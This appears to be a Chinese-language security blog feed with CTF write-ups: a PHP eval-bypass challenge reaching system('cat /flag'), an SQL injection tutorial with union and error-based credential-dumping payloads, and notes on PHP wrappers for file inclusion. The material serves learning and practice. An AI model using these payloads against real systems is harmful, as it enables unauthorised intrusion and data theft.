launched...&lt;br&gt;Cruising...&lt;br&gt;Engaging...Bull\&#39;s-eye!&lt;br&gt;All targets are eliminated.&lt;br&gt;&#39;&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>De1CTF</tag>
        <tag>命令执行</tag>
        <tag>wbe</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj刷题记录7</title>
    <url>/2020/01/10/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%957/</url>
    <content><![CDATA[<h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="CISCN 2019 初赛 Love Math"></a>CISCN 2019 初赛 Love Math</h2><h2 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h2><p><code>eval</code>可以执行PHP语句</p>
<p><code>hex2bin</code>可以将十六进制的字符转成字符串，结果是字符串类型</p>
<p><code>dechex</code>将十进制转换成十六进制，结果是字符串类型</p>
<p>PHP中数组除了可以使用[ ]  还可以使用{ }</p>
<p>PHP中调用shell命令使用<code>system()</code></p>
<a id="more"></a>

<p>PHP中关于进制转换函数,*dec 都是整型，其他都是字符串类型</p>
<p><a href="https://blog.csdn.net/Auuuuuuuu/article/details/88778852" target="_blank" rel="noopener">https://blog.csdn.net/Auuuuuuuu/article/details/88778852</a></p>
<h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>源码分析</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会将输入的字符进行过滤，过滤了空格、换行符、制表符、单双引号、反引号、中括号，以及只能出现白名单中的单词。</p>
<p>最后有一个<code>eval</code>可以执行PHP语句，想办法构造$_GET或者$_POST</p>
<p>可以利用函数转变也可以使用异或</p>
<h2 id="0x03-操作"><a href="#0x03-操作" class="headerlink" title="0x03 操作"></a>0x03 操作</h2><p>payload1：<code>?sin=cat /flag&amp;cos=system&amp;c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{cos}($$pi{sin})</code></p>
<p><img src="../pic/23.png" alt=""></p>
<p>异或方法</p>
<p>开始用python写，字符串转十六进制，纠结了很久很久，只有int可以异或。还是选择PHP</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$need&#x3D;[&#39;_GET&#39;,&#39;_POST&#39;,&#39;_REQUEST&#39;];</span><br><span class="line">$whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];</span><br><span class="line">foreach ($whitelist as $item )</span><br><span class="line">&#123;</span><br><span class="line">    foreach ($need as $x)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        if (in_array($x ^ $item^ $item ,$need))  &#x2F;&#x2F;在PHP中异或</span><br><span class="line">        &#123;</span><br><span class="line">            echo $x ^ $item;</span><br><span class="line">            echo &#39;|--- &#39;.$x.&#39; --- &#39;.$item;</span><br><span class="line">            echo &#39;|&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>在结果中发现有一个纯数字的还有一个<code>9**0</code>,但是没想到怎么利用<code>9**0</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">9**0|--- _GET --- fmod|</span><br><span class="line">8&quot;1&amp;|--- _GET --- getrandmax|</span><br><span class="line">85;!5|--- _POST --- getrandmax|</span><br><span class="line">871#4+79|--- _REQUEST --- getrandmax|</span><br><span class="line">7&quot;&#x3D;0|--- _GET --- hexdec|</span><br><span class="line">75771|--- _POST --- hexdec|</span><br><span class="line">7&gt;5;|--- _GET --- hypot|</span><br></pre></td></tr></table></figure>

<p>构造payload：<code>http://c5da3eac-8e0b-45e3-b441-971c92aa946c.node3.buuoj.cn/?c=$pi=decoct(31737)^hexdec;$$pi{abs}($$pi{cos})</code></p>
<p>post 数据：<code>abs=system&amp;cos=cat /flag</code></p>
<p><img src="../pic/24.png" alt=""></p>
<p>在PHP中无法直接数字与不加引号的字符异或，需要将数字转换成字符类型</p>
<p><img src="../pic/25.png" alt=""></p>
<p><img src="../pic/26.png" alt=""></p>
<p><img src="../pic/27.png" alt=""></p>
<p>PHP异或操作，x位与x+n位异或结果是x位，后面n位直接丢弃。</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>buuctf</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入的原理</title>
    <url>/2020/01/05/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
<a id="more"></a>

<h2 id="0x01-某些函数的使用方法"><a href="#0x01-某些函数的使用方法" class="headerlink" title="0x01 某些函数的使用方法"></a>0x01 某些函数的使用方法</h2><ol>
<li><p>concat(str1,str2,str3,…),将多个字符串连接成一个字符串。</p>
</li>
<li><p>concat_ws(分隔符, str1, str2, …),添加了分割符（concat_ws就是concat with separator）</p>
</li>
<li><p>group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc  ] [separator ‘分隔符’] )，将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</p>
</li>
</ol>
<p><a href="https://blog.csdn.net/Mary19920410/article/details/76545053" target="_blank" rel="noopener">参考文章</a></p>
<ol start="4">
<li><p>if(表达式1，表达式2，表达式3)，如果表达式1的值为真，执行表达式2，否则执行表达式3</p>
</li>
<li><p>substr(str,pos,len)/  mid(str,pos,len),从pos处开始截取，截取长度为len的字符 </p>
<ul>
<li>MySQL: SUBSTR( ), SUBSTRING( )</li>
<li>Oracle: SUBSTR( )</li>
<li>SQL Server: SUBSTRING( ) </li>
</ul>
</li>
<li><p>char()<strong>将十进制数转换成字符</strong>，在过滤掉单双引号的时使用较多；与其相反的是ascii()函数</p>
</li>
<li><p>sleep(n)，暂停数据库n秒，benchmarlk(count，表达式)，将表达式执行count次可以达到延迟效果</p>
</li>
<li><p>Length() 返回字符串的长度</p>
</li>
<li><p>database() 返回当前数据库名称</p>
</li>
<li><p>count(*) ,计数</p>
</li>
<li><p>floor(value)函数返回小于或等于指定值（value）的最小整数</p>
</li>
<li><p>ceiling(value)函数返回大于或等于指定值（value）的最小整数</p>
</li>
<li><p>rand()产生随机数介于0和1之间的一个数,rand(0)，则返回值都为<code>0.15522042769493574</code></p>
</li>
<li><p>查询xml函数<strong>extractvalue(目标xml文档，xml路径)</strong>与更新xml函数<strong>updatexml(目标xml文档，xml路径，更新的内容)</strong>  最大只能出32字符</p>
</li>
<li><p>reverse(str)翻转字符串</p>
</li>
<li><p>limit pos,len，   从pos开始查询，查询len条数据    </p>
</li>
<li><p>set 可以设置变量</p>
</li>
<li><p>prepare 预处理</p>
</li>
<li></li>
</ol>
<h2 id="0x02-操作过程与分析"><a href="#0x02-操作过程与分析" class="headerlink" title="0x02 操作过程与分析"></a>0x02 操作过程与分析</h2><h3 id="a-基本注入"><a href="#a-基本注入" class="headerlink" title="a. 基本注入"></a>a. 基本注入</h3><ol>
<li><p>使用order/group by 判断字段长度</p>
<p>users表中内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from users</span></span><br><span class="line">    -&gt; ;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">+----+----------+------------+</span><br></pre></td></tr></table></figure>

<p><code>?id=%27 order by 3 %23</code></p>
<p><code>?id=%27 order by 4 %23</code></p>
<p><img src="../pic/28.png" alt=""></p>
<p><img src="../pic/29.png" alt=""></p>
<p>4报错，3没有报错，表示此表有三列。</p>
<p><em>sql 控制台的执行结果</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from users where id&#x3D;0 order by 4;</span><br><span class="line">ERROR 1054 (42S22): Unknown column &#39;4&#39; in &#39;order clause&#39;</span><br><span class="line">mysql&gt; select * from user where id&#x3D;0 order by 3;</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>查看回显位置</p>
<p><code>?id=%27 union select 1,2,3 %23</code></p>
<p><img src="../pic/30.png" alt="">  2，3处有回显。</p>
<p><em>sql控制台执行结果</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from user where id&#x3D;0 union select 1,2,3;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | password |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | 2        | 3        |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>因为sql控制台是所有都显示的，网页的界面的前端代码设置回显。</p>
</li>
<li><p>获取数据库名</p>
<p><code>?id=%27 union select 1,database() ,3 %23</code></p>
<p><img src="../pic/31.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from users where id&#x3D;0 union select 1,database(),3;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | security | 3        |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取表名</p>
<p>在mysql的数据库中包含一个数据库，information_schema，其中的tables表中记录所有数据库的表名,table_schema栏记录是所属的数据库，table_name记录数据库包含的表名</p>
<p><img src="/32.png" alt=""></p>
<p><code>?id=%27 union select 1,group_concat(table_name) ,3  from information_schema.tables where table_schema=&#39;security&#39; %23</code></p>
<p><img src="/33.png" alt=""></p>
</li>
<li><p>获取列名</p>
<p>在information_schema中，columns表中记录所有数据库所有表的列名,table_schema栏记录是所属的数据库，table_name记录数据库包含的表名，column_name,记录的是列名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from columns where table_name&#x3D;&#39;users&#39; and table_schema&#x3D;&#39;security&#39;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+---------------+--------------+------------+-------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-------------------+-------------+------------+----------------+---------------------------------+----------------+-----------------------+</span><br><span class="line">| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | ORDINAL_POSITION | COLUMN_DEFAULT | IS_NULLABLE | DATA_TYPE | CHARACTER_MAXIMUM_LENGTH | CHARACTER_OCTET_LENGTH | NUMERIC_PRECISION | NUMERIC_SCALE | DATETIME_PRECISION | CHARACTER_SET_NAME | COLLATION_NAME    | COLUMN_TYPE | COLUMN_KEY | EXTRA          | PRIVILEGES                      | COLUMN_COMMENT | GENERATION_EXPRESSION |</span><br><span class="line">+---------------+--------------+------------+-------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-------------------+-------------+------------+----------------+---------------------------------+----------------+-----------------------+</span><br><span class="line">| def           | security     | users      | id          |                1 | NULL           | NO          | int       |                     NULL |                   NULL |                10 |             0 |               NULL | NULL               | NULL              | int(3)      | PRI        | auto_increment | select,insert,update,references |                |                       |</span><br><span class="line">| def           | security     | users      | username    |                2 | NULL           | NO          | varchar   |                       20 |                     20 |              NULL |          NULL |               NULL | latin1             | latin1_swedish_ci | varchar(20) |            |                | select,insert,update,references |                |                       |</span><br><span class="line">| def           | security     | users      | password    |                3 | NULL           | NO          | varchar   |                       20 |                     20 |              NULL |          NULL |               NULL | latin1             | latin1_swedish_ci | varchar(20) |            |                | select,insert,update,references |                |                       |</span><br><span class="line">+---------------+--------------+------------+-------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-------------------+-------------+------------+----------------+---------------------------------+----------------+-----------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><code>?id=%27 union select 1,group_concat(table_name) ,3  from information_schema.tables where table_schema=&#39;security&#39; %23</code></p>
<p><img src="/34.png" alt=""></p>
</li>
<li><p>获取内容</p>
<p>获取users表的username和password</p>
<p><code>?id=%27 union select 1,group_concat(username) ,group_concat(password)  from users %23</code></p>
<p><img src="/35.png" alt=""></p>
</li>
</ol>
<h3 id="b-报错注入"><a href="#b-报错注入" class="headerlink" title="b. 报错注入"></a>b. 报错注入</h3><ol>
<li><p>查询数据库</p>
<p><code>?id=0&#39; and updatexml(1,concat(1,(select database())),1)%23</code></p>
<p>或者<code>?id=0&#39; and extractvalue(1,concat(1,(select database())))%23</code></p>
<p><code>?id=0&#39; and (select 1 from (select count(*),concat((select database()),floor (rand(0)*2))x from information_schema.tables group by x)a)--+</code>(在测试时，这一条buu上无回显，但是本地是可以的，<strong>此条语句最多能显示64个字符，上面两条最多32个</strong>)</p>
<p><img src="/36.png" alt=""></p>
</li>
<li><p>查询表名 <em>与基本注入相同不在重复</em></p>
</li>
<li><p>查询列名 <em>与基本注入相同不在重复</em></p>
</li>
<li><p>查信息</p>
<p><code>?id=0&#39; and extractvalue(1,concat(1,(select substr(concat(username,&#39;~&#39;,password),1,30) from users limit 2,1 )))%23</code></p>
<p>或者</p>
<p><code>?id=0&#39; and updatexml(1,concat(1,(select substr(concat(username,&#39;~&#39;,password),1,30) from users limit 2,1 )),1)%23</code></p>
<p>或者</p>
<p><code>?id=0&#39; and (select 0 from (select count(*),concat((select concat(username,&#39;~&#39;,password) from users limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a)--+</code></p>
<p>通过修改limit 一条一条查询</p>
</li>
</ol>
<h3 id="c-输出文件注入"><a href="#c-输出文件注入" class="headerlink" title="c. 输出文件注入"></a>c. 输出文件注入</h3>]]></content>
      <categories>
        <category>日常积累</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>关于PHP伪协议的分析</title>
    <url>/2020/01/03/%E5%85%B3%E4%BA%8EPHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h3 id="0X00-简介"><a href="#0X00-简介" class="headerlink" title="0X00 简介"></a>0X00 简介</h3><p>PHP支持的协议和封装协议</p>
<ul>
<li><p><a href="https://www.php.net/manual/zh/wrappers.file.php" target="_blank" rel="noopener">file://</a>   </p>
</li>
<li><p><a href="https://www.php.net/manual/zh/wrappers.http.php" target="_blank" rel="noopener">http://</a></p>
</li>
<li><p><a href="https://www.php.net/manual/zh/wrappers.ftp.php" target="_blank" rel="noopener">ftp://</a></p>
</li>
<li><p><a href="https://www.php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">php://</a>     </p>
<a id="more"></a>
</li>
<li><p><a href="https://www.php.net/manual/zh/wrappers.compression.php" target="_blank" rel="noopener">zlib://</a></p>
</li>
<li><p><a href="https://www.php.net/manual/zh/wrappers.data.php" target="_blank" rel="noopener">data://</a>    </p>
</li>
<li><p><a href="https://www.php.net/manual/zh/wrappers.glob.php" target="_blank" rel="noopener">glob://</a></p>
</li>
<li><p><a href="https://www.php.net/manual/zh/wrappers.phar.php" target="_blank" rel="noopener">phar://</a></p>
</li>
<li><p><a href="https://www.php.net/manual/zh/wrappers.ssh2.php" target="_blank" rel="noopener">ssh2://</a></p>
</li>
<li><p><a href="https://www.php.net/manual/zh/wrappers.rar.php" target="_blank" rel="noopener">rar://</a></p>
</li>
<li><p><a href="https://www.php.net/manual/zh/wrappers.audio.php" target="_blank" rel="noopener">ogg://</a></p>
</li>
<li><p><a href="https://www.php.net/manual/zh/wrappers.expect.php" target="_blank" rel="noopener">expect://</a></p>
</li>
</ul>
<p>常见的文件包含函数：</p>
<p><strong>1. include函数</strong></p>
<p>通过get方法或post方法include的文件首先是从当前文件夹下开始读取，此时目录穿越漏洞可以用</p>
<p>不能够读取自己，否则会出现逻辑错误</p>
<p>如果直接包含一个php文件，则只会显示其中在标签外的内容，以及php代码输出的内容</p>
<p>若要读取php文件的内容，则需要将其编码，例：php://filter/read=convert.base64-encode/resource=123.php</p>
<p>使用时如果有多个文件符合，只会输出第一个</p>
<p><strong>2. highlight_file函数</strong></p>
<p>将文件以内置的颜色输出，可以输出php文件，也可以输出其他文件<br>如果第二个参数return设置为true，那么文件内容将不会输出，而是返回一个字符串</p>
<h4 id="3-show-source函数"><a href="#3-show-source函数" class="headerlink" title="3. show_source函数"></a>3. show_source函数</h4><p>上面函数的别名，功能是一样的</p>
<p><strong>4. file_get_contents函数</strong></p>
<p>将一个文件读入一个字符串<br>包含的文件需要在源码中才能看到，或者使用伪协议将其base64加密</p>
<p><strong>5. fopen函数</strong></p>
<p>因为返回的是一个指针，所以不能够直接读取，需要用fgets或者fread读取指针指向的内容，或者使用fpassthru读取指针指向剩下的内容</p>
<p><strong>6. readfile函数</strong></p>
<p>功能是读取一个文件到缓冲区，返回一个整数(为文件的内字符的长度)</p>
<p><strong>7. file函数</strong></p>
<p>功能是将一个文件读入数组，数组的键是行数(从0开始),数组的值为该行的内容</p>
<p>allow_url_fopen ：on  默认开启  该选项为on便是激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象文件等。</p>
<p>allow_url_include：off  默认关闭，该选项为on便是允许 包含URL 对象文件等。</p>
<h3 id="0x01-file"><a href="#0x01-file" class="headerlink" title="0x01  file://"></a>0x01  file://</h3><p>file://不受<code>allow_url_fopen、allow_url_include·</code>影响</p>
<blockquote>
<p>file:// [文件的绝对路径和文件名]</p>
</blockquote>
<p><a href="http://127.0.0.1/temp.php?file=file:///wamp/www/1.php" target="_blank" rel="noopener">http://127.0.0.1/temp.php?file=file:///wamp/www/1.php</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include($_GET[&#39;file&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="../pic/14.png" alt=""></p>
<p><strong>截断</strong></p>
<p>若读取的文件为非PHP后缀，在php版本&lt;=5.2可使用%00截断</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include($_GET[&#39;file&#39;].’.php’);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x02-php"><a href="#0x02-php" class="headerlink" title="0x02 php://"></a>0x02 php://</h3><p>无需<code>allow_url_fopen on</code>，仅<code>php://input、 php://stdin、 php://memory 、php://temp</code> 需要开启<code>allow_url_include</code>。</p>
<p>php:// 访问各个输入/输出流（I/O streams）</p>
<ol>
<li><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4></li>
</ol>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">支持</th>
</tr>
</thead>
<tbody><tr>
<td align="left">受限于 <a href="https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen" target="_blank" rel="noopener">allow_url_fopen</a></td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">受限于 <a href="https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include" target="_blank" rel="noopener">allow_url_include</a></td>
<td align="left">仅 <em>php://input<em>、 *php://stdin</em>、 *php://memory</em> 和 <em>php://temp</em>。</td>
</tr>
<tr>
<td align="left">允许读取</td>
<td align="left">仅 <em>php://stdin<em>、 *php://input</em>、 <em>php://fd</em>、 *php://memory</em> 和 <em>php://temp</em>。</td>
</tr>
<tr>
<td align="left">允许写入</td>
<td align="left">仅 <em>php://stdout<em>、 *php://stderr</em>、 <em>php://output</em>、 <em>php://fd</em>、 *php://memory</em> 和 <em>php://temp</em>。</td>
</tr>
<tr>
<td align="left">允许追加</td>
<td align="left">仅 <em>php://stdout<em>、 *php://stderr</em>、 <em>php://output</em>、 <em>php://fd</em>、 *php://memory</em> 和 <em>php://temp</em>（等于写入）</td>
</tr>
<tr>
<td align="left">允许同时读写</td>
<td align="left">仅 <em>php://fd*、 *php://memory</em> 和 <em>php://temp</em>。</td>
</tr>
<tr>
<td align="left">支持 <a href="https://www.php.net/manual/zh/function.stat.php" target="_blank" rel="noopener">stat()</a></td>
<td align="left">仅 <em>php://memory</em> 和 <em>php://temp</em>。</td>
</tr>
<tr>
<td align="left">支持 <a href="https://www.php.net/manual/zh/function.unlink.php" target="_blank" rel="noopener">unlink()</a></td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">支持 <a href="https://www.php.net/manual/zh/function.rename.php" target="_blank" rel="noopener">rename()</a></td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">支持 <a href="https://www.php.net/manual/zh/function.mkdir.php" target="_blank" rel="noopener">mkdir()</a></td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">支持 <a href="https://www.php.net/manual/zh/function.rmdir.php" target="_blank" rel="noopener">rmdir()</a></td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">仅仅支持 <a href="https://www.php.net/manual/zh/function.stream-select.php" target="_blank" rel="noopener">stream_select()</a></td>
<td align="left"><em>php://stdin<em>、 *php://stdout</em>、 <em>php://stderr</em>、 *php://fd</em> 和 <em>php://temp</em>。</td>
</tr>
</tbody></table>
<p>​    a. 多用于读取源码php://filter/read=convert.base64-encode/resource=   （<em>include、highlight_file、show_source、readfile</em>可用）</p>
<table>
<thead>
<tr>
<th align="left">名称</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><em>resource=&lt;要过滤的数据流&gt;</em></td>
<td align="left">这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
</tr>
<tr>
<td align="left"><em>read=&lt;读链的筛选列表&gt;</em></td>
<td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（<em>|</em>）分隔。</td>
</tr>
<tr>
<td align="left"><em>write=&lt;写链的筛选列表&gt;</em></td>
<td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（<em>|</em>）分隔。</td>
</tr>
<tr>
<td align="left">*&lt;；两个链的筛选列表&gt;*</td>
<td align="left">任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀 的筛选器列表会视情况应用于读或写链。</td>
</tr>
</tbody></table>
<p>常用筛选过滤列表</p>
<blockquote>
<ol>
<li>string.rot13  rot13加密</li>
<li>string.toupper   转换成大写</li>
<li>string.tolower   转换成小写</li>
<li>string.srip_tags   去除标签</li>
<li>convert.base64-encode &amp; convert.base64-decode</li>
<li>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</li>
</ol>
</blockquote>
<p><img src="../pic/15.png" alt=""></p>
<p><img src="../pic/16.png" alt=""></p>
<p><img src="../pic/17.png" alt="">已经把&lt; &gt;中的数据去除 所以已经没有数据</p>
<ol start="2">
<li><h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p> <em>enctype=”multipart/form-data”</em> 的时候 php://input 是无效的。此协议多用于命令执行需要<strong>allow_url_include：on</strong></p>
</li>
</ol>
<p>​      <img src="../pic/18.png" alt=""> </p>
<p>​       <img src="../pic/19.png" alt=""></p>
<ol start="3">
<li><h3 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h3><p>php://output 是一个只写的数据流， 允许你以 <a href="https://www.php.net/manual/zh/function.print.php" target="_blank" rel="noopener">print</a> 和 <a href="https://www.php.net/manual/zh/function.echo.php" target="_blank" rel="noopener">echo</a> 一样的方式 写入到输出缓冲区。</p>
</li>
</ol>
<h3 id="0x03-zip-bzip2-zlib-协议"><a href="#0x03-zip-bzip2-zlib-协议" class="headerlink" title="0x03 zip://, bzip2://, zlib://协议"></a>0x03 zip://, bzip2://, zlib://协议</h3><p>zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。</p>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">支持</th>
</tr>
</thead>
<tbody><tr>
